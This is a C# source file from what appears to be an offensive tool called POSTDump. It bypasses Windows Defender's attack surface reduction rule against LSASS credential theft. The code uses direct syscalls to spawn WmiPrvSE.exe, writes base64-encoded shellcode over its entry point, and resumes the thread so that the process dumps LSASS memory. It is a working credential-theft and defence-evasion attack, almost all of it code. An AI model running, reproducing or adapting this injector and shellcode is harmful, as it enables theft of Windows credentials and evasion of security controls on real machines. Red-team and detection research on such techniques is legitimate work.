// This is a bypass to dump LSASS with ASR rules enabled "Block credential stealing from the Windows local security authority subsystem (lsass.exe)"
// To enable the ASR rule: Set-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions Enable
using System;
using System.Runtime.InteropServices;
using Data = POSTMiniDump.Data;

namespace POSTDump
{
    public class ASR
    {
        [DllImport("ntdll.dll")]
        private static extern uint RtlCreateProcessParametersEx(ref IntPtr processParameters, ref Data.UNICODE_STRING imagePathName, IntPtr dllPath, IntPtr currentDirectory, IntPtr commandLine, IntPtr environment, IntPtr windowTitle, IntPtr desktopInfo, IntPtr shellInfo, IntPtr runtimeData, uint flags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate UInt32 NtCreateUserProcess(ref IntPtr ProcessHandle, ref IntPtr ThreadHandle, uint ProcessDesiredAccess, uint ThreadDesiredAccess, IntPtr ProcessObjectAttributes, IntPtr ThreadObjectAttributes, UInt32 ProcessFlags, UInt32 ThreadFlags, IntPtr ProcessParameters, ref PS_CREATE_INFO CreateInfo, ref PS_ATTRIBUTE_LIST AttributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtQueryInformationProcess(IntPtr hProcess, int pic, ref Data.PROCESS_BASIC_INFORMATION pbi, UInt32 cb, ref UInt32 pSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, int bytesToRead, ref uint bytesRead);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength, out UInt32 BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate UInt32 NtResumeThread(IntPtr ThreadHandle, ref uint SuspendCount);

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_CREATE_INFO
        {
            public UIntPtr Size;
            public uint State;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 76)]
            public byte[] unused;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_ATTRIBUTE
        {
            public ulong Attribute;
            public ulong Size;
            public IntPtr Value;
            public IntPtr ReturnLength;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_ATTRIBUTE_LIST
        {
            public UIntPtr TotalLength;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public PS_ATTRIBUTE[] Attributes;
        }

        private static byte[] dec(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];
            int keypos = 0;
            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[keypos]);
                keypos++;
                if (keypos == key.Length) { keypos = 0; }
            }

            return decrypted;
        }

        public static bool Run()
        {
            var imagePath = new Data.UNICODE_STRING();
            POSTMiniDump.Utils.RtlInitUnicodeString(ref imagePath, @"\??\C:\Windows\System32\wbem\WmiPrvSE.exe");

            var processParams = IntPtr.Zero;
            var status = RtlCreateProcessParametersEx(ref processParams, ref imagePath, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x01);
            if (status != 0)
            {
                Console.WriteLine("RtlCreateProcessParametersEx failed");
                return false;
            }

            var ci = new PS_CREATE_INFO();
            ci.Size = (UIntPtr)88; // sizeof(PS_CREATE_INFO)
            ci.State = 0;
            ci.unused = new byte[76];

            var attribute = new PS_ATTRIBUTE();
            var attributeList = new PS_ATTRIBUTE_LIST();
            attributeList.TotalLength = (UIntPtr)40; // this is sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE) 
            attributeList.Attributes = new PS_ATTRIBUTE[2];

            attributeList.Attributes[0].Attribute = 0x20005;
            attributeList.Attributes[0].Size = imagePath.Length;
            attributeList.Attributes[0].Value = imagePath.Buffer;

            var hProcess = IntPtr.Zero;
            var hThread = IntPtr.Zero;
            
            NtCreateUserProcess NTCP = (NtCreateUserProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtCreateUserProcess"), typeof(NtCreateUserProcess));
            uint res = NTCP(ref hProcess, ref hThread, 0x001F0FFF, 0x001F0FFF, IntPtr.Zero, IntPtr.Zero, 0, 0x00000001, processParams, ref ci, ref attributeList);
            if (status != 0)
            {
                Console.WriteLine("NtCreateUserProcess failed");
                return false;
            }

            Data.PROCESS_BASIC_INFORMATION bi = new Data.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            NtQueryInformationProcess NTQP = (NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtQueryInformationProcess"), typeof(NtQueryInformationProcess));
            NTQP(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            uint nRead = 0;

            ISyscall.NtReadVirtualMemory NTRVM = (ISyscall.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntreadptr, typeof(ISyscall.NtReadVirtualMemory));
            NTRVM(hProcess, ptrToImageBase, addrBuf, (uint)addrBuf.Length, ref nRead);
            IntPtr WmiPrvSEBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            NTRVM(hProcess, WmiPrvSEBase, data, (uint)data.Length, ref nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)WmiPrvSEBase);

            // https://osandamalith.com/2019/05/11/shellcode-to-dump-the-lsass-process/
            // This shellcode is for Windows 10 and Server 2019 x86_64.
            // Tested also on Windows 11 x64.
            byte[] buf = Convert.FromBase64String("QVNBUEFRQVdRSYP3W0mD8FVJ/8NJg8ApSf/ISYPoLkmD6yZIg/kJSffALQAAAEmDw1tJ98M/AAAASf/ISYPpQ0mD8xRJ/8FJ98MhAAAASYPzF0j3wRYAAABIg/FXSIPpWkiDwTZJg+tFSP/JSIPpVUmD6DhI98FbAAAASf/PSYP4K0n3wU4AAABJ98dAAAAASYPpTkmD8B1I/8FJg/8ySIPxS0mD8FBJ98E5AAAASf/BSYPxOkj3wSMAAABJg/86SYPBF0mD719Jg+s8Sf/AQVtBWEFZQV9Z6RsDAADMzMxIiVwkCEiJdCQQV0iD7BBlSIsEJWAAAACL8UiLUBhMi0oQTYtBME2FwA+EuAAAAEEPEEFYSWNAPE2LCUKLnACIAAAAM9LzD38EJIXbdNRIiwQkSMHoEEQPt9BFhdJ0IEiLTCQIRYvawcoNgDlhD74BfAODwuAD0Ej/wUn/y3XoTY0UGDPJQYt6IEkD+EE5Shh2kIsfRTPbSI1/BEkD2EHByw0PvgNI/8NEA9iAe/8Ade1BjQQTO8Z0Df/BQTtKGHLR6Vz///9Bi0IkA8lJA8APtwQBQYtKHMHgAkiYSQPAiwQBSQPA6wIzwEiLXCQgSIt0JChIg8QQX8PMzMxAVVNWV0FUQVVBVkFXSI2sJCj///9IgezYAQAAM8BIjX2guTABAADzqkUz9rlMdyYHx0WAa2VybsdFhGVsMzLHRYguZGxsRIh1jMdEJHBkYmdjx0QkdG9yZS7HRCR4ZGxsAMdEJGBudGRsx0QkZGwuZGxmx0QkaGwAx0QkUGxzYXPHRCRUcy5kbWbHRCRYcADHRCRAbHNhc8dEJERzLmV4ZsdEJEhlAMaFIAEAAGHoUf7//0iNTYBIi/j/10iNTCRw/9dIjUwkYP/XuYA5HpLoMP7//7na9tpPSIvw6CP+//+5J6noZ0iL+OgW/v//uY1SAb1Ii9joCf7//7l0cY3cTIvg6Pz9//+5tHON4kyL+Ojv/f//ue6VtlBMi+jo4v3//7k918huSImFMAEAAOjR/f//uXoZd2pIiUWQ6MP9//9MjY0oAQAAQY1OFEUzwLIB/9BMIXQkMEiNTCRQRTPJRTPAugAAABDHRCQogAAAAMdEJCACAAAA/9cz0kiJhTgBAACNSgL/1kiNVaDHRaAwAQAASIvISIv4/9Mz24XAdDHrHEiNVaBIi89B/9RIjVXMSI2NIAEAAEH/1USLdahIjVQkQEiNjSABAABB/9eFwHXRRYvGM9K5//8fAP+VMAEAAEyLhTgBAABIiVwkMEiLyEG5AgAAAEGL1kiJXCQoSIlcJCD/VZBIgcTYAQAAQV9BXkFdQVxfXltdw8xWSIv0SIPk8EiD7CDo0/3//0iL5l7D");

            IntPtr RegSize = (IntPtr)buf.Length;
            IntPtr addr = addressOfEntryPoint;
            ISyscall.NtProtectVirtualMemory NTP = (ISyscall.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntprotptr, typeof(ISyscall.NtProtectVirtualMemory));
            NTP(hProcess, ref addressOfEntryPoint, ref RegSize, 0x04, out uint old);

            IntPtr buffer = Marshal.AllocHGlobal(buf.Length);
            Marshal.Copy(buf, 0, buffer, buf.Length);
            ISyscall.NtWriteVirtualMemory NTW = (ISyscall.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntwriteptr, typeof(ISyscall.NtWriteVirtualMemory));
            NTW(hProcess, addr, buffer, (uint)buf.Length, out nRead);
            if (nRead == 0)
            {
                Console.WriteLine("Write failed");
                return false;
            }
            NTP(hProcess, ref addressOfEntryPoint, ref RegSize, old, out uint _);

            NtResumeThread NTRT = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtResumeThread"), typeof(NtResumeThread));
            uint s = 0;
            NTRT(hThread, ref s);
            
            return true;
        }
    }
}
